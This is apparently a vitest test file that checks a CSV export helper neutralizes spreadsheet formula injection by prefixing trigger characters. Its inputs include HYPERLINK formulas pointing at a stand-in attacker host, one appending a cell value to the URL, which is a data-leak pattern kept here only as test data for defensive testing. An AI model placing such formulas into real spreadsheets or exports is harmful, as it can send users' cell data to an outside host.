import { describe, it, expect } from 'vitest';
import { escapeCsv } from '../../src/shared/csv';
import { FORMULA_TRIGGERS, expectNeutralized, parseCsvField } from '../helpers/csv-formula';

describe('escapeCsv formula neutralization', () => {
  it.each(FORMULA_TRIGGERS)('prefixes a leading %j formula trigger with an apostrophe', (trigger) => {
    const original = `${trigger}1+1`;
    expectNeutralized(parseCsvField(escapeCsv(original)), original);
  });

  it('prefixes a HYPERLINK formula whose quotes would otherwise only be CSV-escaped', () => {
    const original = '=HYPERLINK("http://attacker.example/x?d="&B2)';
    expectNeutralized(parseCsvField(escapeCsv(original)), original);
  });

  it('prefixes a formula that also contains a comma and a quote', () => {
    const original = '=HYPERLINK("http://attacker.example/x", "open")';
    expectNeutralized(parseCsvField(escapeCsv(original)), original);
  });

  it('prefixes a tab-prefixed formula that also contains a comma', () => {
    const original = '\t=1+1,2';
    expectNeutralized(parseCsvField(escapeCsv(original)), original);
  });
});
